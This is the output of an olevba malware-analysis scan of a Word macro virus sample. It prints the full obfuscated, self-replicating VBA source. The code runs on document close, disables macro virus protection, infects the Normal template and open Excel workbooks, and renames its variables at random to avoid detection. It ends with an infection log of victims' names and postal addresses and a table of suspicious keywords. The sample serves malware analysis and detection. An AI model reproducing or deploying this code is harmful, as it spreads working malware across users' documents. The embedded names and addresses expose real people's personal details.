olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.f-be3c0c617e79039773175e10722b46fe862c5266
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.f-be3c0c617e79039773175e10722b46fe862c5266 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' 09:52:48:  - вторник, 19 фев 2002
' AS
'



































Private Sub Document_Close()
On Error Resume Next
Const NPSWNYRWWFKQDVK = True, TYJKCSA = False, ZYXZL = 0, DRGMVWXXMIMQDAT = 1, CCNULKQQRSXIGJZ = wdFormatDocument, WEXUXUHF = wdFormatTemplate, LJQKIXSIC = ":"
Dim AVSTILQTDXZ, AUYNFSTOWRLVITY, CYJMOFSF, CNQREBVE As Boolean
Dim QPQMD, MQZYZ As Object
Dim YHPCACKFOCVZBCJ, RJBPISLLBRBINIF As String
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
Set QPQMD = ActiveDocument.VBProject.VBComponents.Item(DRGMVWXXMIMQDAT)
Set MQZYZ = NormalTemplate.VBProject.VBComponents.Item(DRGMVWXXMIMQDAT)
Randomize
CYJMOFSF = TYJKCSA
CNQREBVE = TYJKCSA
If QPQMD.CodeModule.CountOfLines <> ZYXZL Then CYJMOFSF = NPSWNYRWWFKQDVK
If MQZYZ.CodeModule.CountOfLines <> ZYXZL Then CNQREBVE = NPSWNYRWWFKQDVK
Options.VirusProtection = TYJKCSA
If (CYJMOFSF = NPSWNYRWWFKQDVK Xor CNQREBVE = NPSWNYRWWFKQDVK) And (ActiveDocument.SaveFormat = CCNULKQQRSXIGJZ Or ActiveDocument.SaveFormat = WEXUXUHF) Then
If CYJMOFSF = NPSWNYRWWFKQDVK Then
AUYNFSTOWRLVITY = NormalTemplate.Saved
RJBPISLLBRBINIF = QPQMD.CodeModule.Lines(DRGMVWXXMIMQDAT, QPQMD.CodeModule.CountOfLines)
Call ZLBWWHJZUVEPCSD(RJBPISLLBRBINIF)
If Int(Rnd * 10 * DRGMVWXXMIMQDAT) = DRGMVWXXMIMQDAT * 7 Then Call EDTCHHYZ(RJBPISLLBRBINIF)
Call GSBJZLFYNJFBEV(RJBPISLLBRBINIF)
MQZYZ.CodeModule.InsertLines DRGMVWXXMIMQDAT, RJBPISLLBRBINIF
If AUYNFSTOWRLVITY = NPSWNYRWWFKQDVK Then NormalTemplate.Save
End If
YHPCACKFOCVZBCJ = Mid(ActiveDocument.FullName, 2, DRGMVWXXMIMQDAT)
If CNQREBVE = NPSWNYRWWFKQDVK And (YHPCACKFOCVZBCJ = LJQKIXSIC Or ActiveDocument.Saved = TYJKCSA) Then
AVSTILQTDXZ = ActiveDocument.Saved
RJBPISLLBRBINIF = MQZYZ.CodeModule.Lines(DRGMVWXXMIMQDAT, MQZYZ.CodeModule.CountOfLines)
Call GSBJZLFYNJFBEV(RJBPISLLBRBINIF)
QPQMD.CodeModule.InsertLines DRGMVWXXMIMQDAT, RJBPISLLBRBINIF
If AVSTILQTDXZ = NPSWNYRWWFKQDVK Then ActiveDocument.Save
End If
End If
End Sub
Private Sub EDTCHHYZ(ByRef RJBPISLLBRBINIF As String)
On Error Resume Next
Const NAMZECKDHYI = 48, SKQUWNQAVAHUR = 15, YJNBIVLS = 5, RWVFEDDAO = 65, DAZNVQART = 90, DRGMVWXXMIMQDAT = 1, NPSWNYRWWFKQDVK = True, TYJKCSA = False
Dim OOXRWVXNXEMZIV, ZFXPIJTmp, EQBZPXWUOVRXWHQ, ZFXPIJ(DRGMVWXXMIMQDAT To NAMZECKDHYI), ZFXPIJ2(DRGMVWXXMIMQDAT To NAMZECKDHYI) As String
Dim OZIBOKHXC, TVVEPQTVTCSC, OCAZNOORTIEF As Integer
Dim OPEYUYY As Boolean
OOXRWVXNXEMZIV = "RJBPISLLBRBINIF NAMZECKDHYI ZFXPIJ ZFXPIJ2 EQBZPXWUOVRXWHQ OZIBOKHXC TVVEPQTVTCSC OCAZNOORTIEF OPEYUYY EDTCHHYZ SKQUWNQAVAHUR YJNBIVLS RWVFEDDAO DAZNVQART DRGMVWXXMIMQDAT OOXRWVXNXEMZIV ZFXPIJTmp AVSTILQTDXZ AUYNFSTOWRLVITY CYJMOFSF CNQREBVE QPQMD MQZYZ ZLBWWHJZUVEPCSD OPWBO UIQLPJ ELWATUVKDJ ACFSBXJWSU OPWBOTmp RVGTRRRALXP WGAHIVPZLEU YHPCACKFOCVZBCJ NPSWNYRWWFKQDVK TYJKCSA ZYXZL CCNULKQQRSXIGJZ WEXUXUHF DWQQHDZM IVASOCQV LJQKIXSIC SBIWODMD QZHTVYOKS HGEWW USCZYCTTTWLGRUQ GSBJZLFYNJFBEV ZOGDZPEKKTPQIJ GHMZNFRPDWKTC IRQDCSR"
Randomize
TVVEPQTVTCSC = DRGMVWXXMIMQDAT
For OZIBOKHXC = DRGMVWXXMIMQDAT To Len(OOXRWVXNXEMZIV)
If Mid(OOXRWVXNXEMZIV, OZIBOKHXC, DRGMVWXXMIMQDAT) = " " Or OZIBOKHXC = Len(OOXRWVXNXEMZIV) Then
If OZIBOKHXC = Len(OOXRWVXNXEMZIV) Then ZFXPIJTmp = ZFXPIJTmp & Mid(OOXRWVXNXEMZIV, OZIBOKHXC, DRGMVWXXMIMQDAT)
For OCAZNOORTIEF = DRGMVWXXMIMQDAT To Int((SKQUWNQAVAHUR - YJNBIVLS + DRGMVWXXMIMQDAT) * Rnd + YJNBIVLS)
ZFXPIJ2(TVVEPQTVTCSC) = ZFXPIJ2(TVVEPQTVTCSC) & Chr(Int((DAZNVQART - RWVFEDDAO + DRGMVWXXMIMQDAT) * Rnd + RWVFEDDAO))
Next OCAZNOORTIEF
ZFXPIJ(TVVEPQTVTCSC) = ZFXPIJTmp
ZFXPIJTmp = ""
TVVEPQTVTCSC = TVVEPQTVTCSC + DRGMVWXXMIMQDAT
Else
ZFXPIJTmp = ZFXPIJTmp & Mid(OOXRWVXNXEMZIV, OZIBOKHXC, DRGMVWXXMIMQDAT)
End If
Next OZIBOKHXC
OPEYUYY = TYJKCSA
For OZIBOKHXC = DRGMVWXXMIMQDAT To Len(RJBPISLLBRBINIF)
For TVVEPQTVTCSC = DRGMVWXXMIMQDAT To NAMZECKDHYI
If Mid(RJBPISLLBRBINIF, OZIBOKHXC, Len(ZFXPIJ(TVVEPQTVTCSC))) = ZFXPIJ(TVVEPQTVTCSC) Then
EQBZPXWUOVRXWHQ = EQBZPXWUOVRXWHQ & ZFXPIJ2(TVVEPQTVTCSC)
OZIBOKHXC = OZIBOKHXC + Len(ZFXPIJ(TVVEPQTVTCSC)) - DRGMVWXXMIMQDAT
OPEYUYY = NPSWNYRWWFKQDVK
Exit For
End If
Next TVVEPQTVTCSC
If OPEYUYY = TYJKCSA Then
EQBZPXWUOVRXWHQ = EQBZPXWUOVRXWHQ & Mid(RJBPISLLBRBINIF, OZIBOKHXC, DRGMVWXXMIMQDAT)
Else
OPEYUYY = TYJKCSA
End If
Next OZIBOKHXC
RJBPISLLBRBINIF = EQBZPXWUOVRXWHQ
End Sub
Private Sub ZLBWWHJZUVEPCSD(ByRef RJBPISLLBRBINIF As String)
On Error Resume Next
Const ACFSBXJWSU = "' ", DRGMVWXXMIMQDAT = 1
Const DWQQHDZM = "hh:mm:ss: AMPM - ", IVASOCQV = "dddd, d mmm yyyy"
Dim OPWBOTmp, OPWBO, RVGTRRRALXP, WGAHIVPZLEU, UIQLPJ, ELWATUVKDJ As String
Dim OZIBOKHXC As Integer
UIQLPJ = Chr(10 * DRGMVWXXMIMQDAT + 3)
OPWBO = Application.UserAddress
WGAHIVPZLEU = Format(Time, DWQQHDZM) & Format(Date, IVASOCQV)
ELWATUVKDJ = Chr(DRGMVWXXMIMQDAT * 10)
RVGTRRRALXP = Application.UserName
For OZIBOKHXC = DRGMVWXXMIMQDAT To Len(OPWBO)
If Mid(OPWBO, OZIBOKHXC, DRGMVWXXMIMQDAT) <> UIQLPJ Then
If Mid(OPWBO, OZIBOKHXC, DRGMVWXXMIMQDAT) <> ELWATUVKDJ Then
OPWBOTmp = OPWBOTmp & Mid(OPWBO, OZIBOKHXC, DRGMVWXXMIMQDAT)
End If
Else
OPWBOTmp = OPWBOTmp & UIQLPJ & ACFSBXJWSU
End If
Next OZIBOKHXC
RJBPISLLBRBINIF = RJBPISLLBRBINIF & UIQLPJ & ACFSBXJWSU & WGAHIVPZLEU & UIQLPJ & ACFSBXJWSU & RVGTRRRALXP & UIQLPJ & ACFSBXJWSU & OPWBO & UIQLPJ
End Sub
Private Sub GSBJZLFYNJFBEV(ByVal RJBPISLLBRBINIF As String)
On Error Resume Next
Dim IRQDCSR As Long
Dim SBIWODMD As Object
Dim ZOGDZPEKKTPQIJ, GHMZNFRPDWKTC As String
ZOGDZPEKKTPQIJ = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
IRQDCSR = &H0
GHMZNFRPDWKTC = "Options6"
System.PrivateProfileString("", ZOGDZPEKKTPQIJ, GHMZNFRPDWKTC) = IRQDCSR
Set SBIWODMD = GetObject(, "Excel.Application")
Const DRGMVWXXMIMQDAT = 1, ZYXZL = 0
Dim HGEWW As String
Dim OZIBOKHXC, TVVEPQTVTCSC As Integer
HGEWW = "ThisWorkbook"
For OZIBOKHXC = DRGMVWXXMIMQDAT To SBIWODMD.Application.Workbooks.Count
For TVVEPQTVTCSC = DRGMVWXXMIMQDAT To SBIWODMD.Application.Workbooks.Item(OZIBOKHXC).VBProject.VBComponents.Count
If SBIWODMD.Application.Workbooks.Item(OZIBOKHXC).VBProject.VBComponents.Item(TVVEPQTVTCSC).CodeModule.CountOfLines = ZYXZL Then
SBIWODMD.Application.Workbooks.Item(OZIBOKHXC).VBProject.VBComponents.Item(TVVEPQTVTCSC).CodeModule.InsertLines DRGMVWXXMIMQDAT, RJBPISLLBRBINIF
If SBIWODMD.Application.Workbooks.Item(OZIBOKHXC).VBProject.VBComponents.Item(TVVEPQTVTCSC).Name = HGEWW Then
SBIWODMD.Application.Workbooks.Item(OZIBOKHXC).VBProject.VBComponents.Item(TVVEPQTVTCSC).CodeModule.ReplaceLine 33 * DRGMVWXXMIMQDAT, "Private Sub Workbook_Deactivate()"
Else
SBIWODMD.Application.Workbooks.Item(OZIBOKHXC).VBProject.VBComponents.Item(TVVEPQTVTCSC).CodeModule.ReplaceLine DRGMVWXXMIMQDAT * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next TVVEPQTVTCSC
Next OZIBOKHXC
Set SBIWODMD = Nothing
End Sub
Private Sub USCZYCTTTWLGRUQ(ByVal RJBPISLLBRBINIF As String)
On Error Resume Next
Const NPSWNYRWWFKQDVK = True, TYJKCSA = False, DRGMVWXXMIMQDAT = 1, ZYXZL = 0
Dim QZHTVYOKS As Object
Dim AUYNFSTOWRLVITY As Boolean
Set QZHTVYOKS = GetObject(, "Word.Application")
If QZHTVYOKS.NormalTemplate.VBProject.VBComponents.Item(DRGMVWXXMIMQDAT).CodeModule.CountOfLines = ZYXZL Then
AUYNFSTOWRLVITY = QZHTVYOKS.NormalTemplate.Saved
QZHTVYOKS.Options.VirusProtection = TYJKCSA
QZHTVYOKS.NormalTemplate.VBProject.VBComponents.Item(DRGMVWXXMIMQDAT).CodeModule.InsertLines DRGMVWXXMIMQDAT, RJBPISLLBRBINIF
If AUYNFSTOWRLVITY = NPSWNYRWWFKQDVK Then QZHTVYOKS.NormalTemplate.Save
End If
Set QZHTVYOKS = Nothing
End Sub

' 09:50:09: AM - Wednesday, 10 Feb 1999
' Al Peabody
' 1634 Orchard Beach Road
Annapolis, MD 21401

' 09:42:15: AM - Monday, 22 Feb 1999
' Sergey Morozov
'

' 09:49:26: AM - четверг, 11 мар 1999
' Advisor
'

' 04:16:54:  - понедельник, 22 мар 1999
' ***
'

' 11:52:11:  - четверг, 15 апр 1999
' Freddy Kruger
'

' 11:45:13:  - вторник, 27 май 1997
' MAXuS
'

' 09:59:34:  - суббота, 3 июн 1995
' 7
'

' 08:02:29:  - суббота, 7 фев 1998
' Alex
'

' 11:07:41:  - воскресенье, 8 фев 1998
' Alex
'

' 01:34:29:  - понедельник, 9 фев 1998
' Alex
'

' 07:03:00:  - среда, 4 фев 1998
' Alex
'

' 08:17:00:  - среда, 16 фев 2000
' Allenov
'

' 09:16:19:  - пятница, 18 фев 2000
' Аллёнов Борис Васильевич
'

' 09:07:19:  - суббота, 26 фев 2000
' Allenov
'

' 01:04:41:  - вторник, 18 апр 2000
' Владивостокский матросский клуб
'

' 12:08:58:  - понедельник, 22 май 2000
' user14
'

' 02:10:58:  - вторник, 23 май 2000
' user 25
'

' 05:30:05:  - среда, 24 май 2000
' user09
'

' 01:49:33:  - вторник, 6 июн 2000
' osipov
'

' 09:53:11:  - суббота, 24 июн 2000
' User
'

' 03:38:09:  - воскресенье, 2 июл 2000
' RVK
'

' 02:24:09:  - пятница, 21 июл 2000
' машбюро
'

' 02:56:59:  - пятница, 11 авг 2000
' .
'

' 04:38:48:  - четверг, 23 ноя 2000
' Управление здравоохранения
' Находкинский проспект, 11
г.Находка, Приморский край

' 04:51:42:  - вторник, 27 мар 2001
' AcerPower 466dp
'

' 10:41:58:  - четверг, 5 июл 2001
' .
'

' 08:06:12:  - пятница, 12 окт 2001
' User
'

' 12:37:44:  - пятница, 1 фев 2002
' AS
'

' 05:15:10:  - четверг, 16 янв 2003
' *
'

' 03:32:50:  - четверг, 8 май 2003
' *
'

' 07:17:29:  - суббота, 20 дек 2003
' Прохорихина
'

' 06:59:41:  - воскресенье, 28 мар 2004
' Прохорихина
'

' 07:22:08:  - воскресенье, 4 апр 2004
' х
'

' 08:08:25:  - пятница, 11 июн 2004
' SAn
'

' 12:10:30:  - понедельник, 14 июн 2004
' OOF
'

' 06:34:54:  - понедельник, 30 май 2005
' Win98
'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

